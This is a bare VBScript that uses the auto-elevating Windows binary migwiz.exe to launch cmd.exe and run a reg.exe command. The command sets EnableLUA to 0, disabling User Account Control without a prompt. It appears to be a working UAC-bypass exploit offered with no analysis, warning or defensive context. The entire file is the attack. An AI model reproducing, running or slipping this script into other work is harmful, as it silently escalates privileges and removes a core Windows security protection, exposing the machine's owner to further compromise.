File = "C:\Windows\System32\cmd.exe"
Set shll = CreateObject("Wscript.Shell")
shll.run("C:\Windows\System32\migwiz\migwiz.exe " & File & " /c %windir%\System32\reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f"),1,true